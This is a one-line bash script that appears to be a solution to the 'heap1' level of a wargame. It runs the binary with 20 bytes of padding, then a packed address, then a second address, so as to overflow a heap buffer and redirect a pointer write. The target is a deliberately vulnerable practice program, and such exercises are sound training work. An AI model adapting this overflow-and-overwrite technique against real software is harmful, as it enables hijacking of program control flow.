#!/bin/bash

./heap1 $(python -c "print 'A'*20+'\x74\x97\x04\x08'") $(echo -e "\x94\x84\x04\x08")
